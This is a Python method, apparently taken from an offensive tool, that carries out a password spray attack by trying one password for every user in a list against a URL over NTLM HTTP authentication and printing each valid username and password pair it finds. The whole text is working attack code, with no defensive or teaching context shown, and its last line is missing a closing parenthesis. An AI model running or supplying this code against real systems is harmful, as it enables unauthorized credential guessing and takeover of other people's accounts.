def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    count = 0
    for user in self.users:
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found"
